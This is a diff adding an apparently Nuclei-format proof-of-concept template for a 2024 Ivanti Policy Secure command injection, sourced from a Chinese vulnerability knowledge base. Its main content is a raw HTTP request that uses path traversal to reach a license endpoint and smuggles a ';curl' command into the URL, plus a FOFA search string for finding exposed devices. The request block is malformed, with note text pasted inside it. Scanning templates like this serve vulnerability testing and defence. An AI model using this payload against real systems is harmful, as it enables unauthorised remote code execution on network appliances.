@@ -1,0 +1,40 @@
+id: poc-vba186uxt8sd6fan
+info:
+  name: Ivanti policy secure 命令注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vba186uxt8sd6fan'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vba186uxt8sd6fan
+    fofa: body="welcome.cgi?p=logo"
+http:
+- raw:
+  - 'GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20www.baidu.com HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ive-licCount
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
